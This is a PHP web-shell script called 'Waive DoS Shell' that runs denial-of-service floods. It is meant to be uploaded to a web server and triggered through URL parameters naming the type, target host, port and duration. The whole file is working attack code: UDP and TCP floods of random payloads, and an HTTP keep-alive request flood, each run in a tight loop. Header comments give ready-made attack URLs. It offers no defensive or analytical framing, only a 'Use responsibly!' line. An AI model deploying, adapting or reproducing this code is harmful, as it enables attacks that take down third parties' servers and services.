<?php
//  _  _  _       _               _____          _____      ______           _ _ 
// | || || |     (_)             (____ \        |  ___|    |  __| |         | | |
// | || || | ____ _ _   _ ____    _   \ \ ___    \ \        \ \ | | _   ____| | |
// | ||_|| |/ _  | | | | / _  )  | |   | / _ \    \ \        \ \| || \ / _  ) | |
// | |___| ( ( | | |\ V ( (/ /   | |__/ / |_| |____) )   _____) ) | | ( (/ /| | |
//  \______|\_||_|_| \_/ \____)  |_____/ \___(______/   (______/|_| |_|\____)_|_|                                                                              

// Coded by ~Waived
// Github: https://github.com/waived
// Version: 4.0

// Covered by the GNU GPL 3.0

// HOW TO USE:
// Layer4:
//    http://www.example.com/waiveshell.php?type=udp&host=0.0.0.0&port=80&time=300
//    http://www.example.com/waiveshell.php?type=tcp&host=0.0.0.0&port=80&time=300
//
// Layer7:
//    http://www.example.com/waiveshell.php?type=http&host=www.site.com&port=80&time=300

// Note: Parameter "time" is the duration of the attack in seconds.
//       Waive DoS Shell accepts both domain names and IP addresses as a "host" parameter.
//       It does NOT however handle entire URLs, ex: "http://www.something.com/index.html"

// Use responsibly!

//  _   _ ___  ___   ___ _              _ 
// | | | |   \| _ \ | __| |___  ___  __| |
// | |_| | |) |  _/ | _|| / _ \/ _ \/ _` |
//  \___/|___/|_|   |_| |_\___/\___/\__,_|                                        
function _udp($ip, $port, $time) {
    echo "Frying " . $ip . ":" . $port . " via UDP for " . $time . " seconds...";
    
    // Record the start time
    $start_time = microtime(true);

    // Attack for duration
    while ((microtime(true) - $start_time) < $time) {
    
        try {
            // generate data buffer
            $data = random_bytes(mt_rand(1000, 1200));
            
            // create socket
            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            
            // send + close
            socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
            socket_close($socket);
            
        } catch (Exception $e) {
            // echo "An error occurred: " . $e->getMessage();
        }
    }

    // power-down | 0.5 second sleep | 500000 microseconds
    usleep(500000);
}


//   _____ ___ ___   ___ _              _ 
//  |_   _/ __| _ \ | __| |___  ___  __| |
//    | || (__|  _/ | _|| / _ \/ _ \/ _` |
//    |_| \___|_|   |_| |_\___/\___/\__,_|
function _tcp($ip, $port, $time) {
    echo "Disintegrating " . $ip . ":" . $port . " via TCP for " . $time . " seconds...";

    // Record the start time
    $start_time = microtime(true);

    // Attack for duration
    while ((microtime(true) - $start_time) < $time) {
    
        try {
            // generate data buffer
            $data = random_bytes(mt_rand(1000, 1200));
            
            // create socket
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            
            // connect
            socket_connect($socket, $ip, $port);
            
            // send
            socket_write($socket, $data, strlen($data));
            
            // reuse to prevent TIME_WAIT local-socket exhaustion
            while ((microtime(true) - $start_time) < $time) {
                // generate new data buffer
                $data = random_bytes(mt_rand(1000, 1200));

                // send new buffer
                socket_write($socket, $data, strlen($data));
            }
            
            // close socket upon end of duration / error
            socket_close($socket);
            
        } catch (Exception $e) {
            // echo "An error occurred: " . $e->getMessage();
        }
    }

    // power-down | 0.5 second sleep | 500000 microseconds
    usleep(500000);
}


//   _  _ _____ _____ ___   ___ _              _ 
//  | || |_   _|_   _| _ \ | __| |___  ___  __| |
//  | __ | | |   | | |  _/ | _|| / _ \/ _ \/ _` |
//  |_||_| |_|   |_| |_|   |_| |_\___/\___/\__,_|                                              
function _http($ip, $host, $port, $time) {
    echo "Vaporizing " . $host . " via HTTP for " . $time . " seconds...";
    
    // Record the start time
    $start_time = microtime(true);

    $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";

    // Attack for duration
    while ((microtime(true) - $start_time) < $time) {
        try {
            // create socket
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            
            // connect
            socket_connect($socket, $ip, $port);
            
            // send
            socket_write($socket, $data, strlen($data));
            
            // reuse to prevent TIME_WAIT local-socket exhaustion
            while ((microtime(true) - $start_time) < $time) {
                socket_write($socket, $data, strlen($data));
            }
            
            // close socket upon end of duration / error
            socket_close($socket);
            
        } catch (Exception $e) {
            // echo "An error occurred: " . $e->getMessage();
        }
    }

    // power-down | 0.5 second sleep | 500000 microseconds
    usleep(500000);
}

// Check if all required parameters are set
if(isset($_GET['type']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time'])) {
    // Retrieve parameters
    $type = $_GET['type'];
    $host = $_GET['host']; // Changed from 'site' to 'host'
    $port = $_GET['port'];
    $time = $_GET['time'];
    
    $ip = gethostbyname($host);
    
    if (strtolower($type) === 'udp') {
        _udp($ip, $port, $time);
    } elseif (strtolower($type) === 'tcp') {
        _tcp($ip, $port, $time);
    } elseif (strtolower($type) === 'http') {
       _http($ip, $host, $port, $time); // Passed $host instead of $site
    } else {
      // idk bruh
    }

} else {
    echo "You've reached the landing page of Waived Shell 1.0\r\n"; // Added semicolon
    echo "Arguments: type, host, port, time\r\n\r\n"; // Fixed typo and added semicolon
    echo "Type: udp, tcp, or http";
}
?>
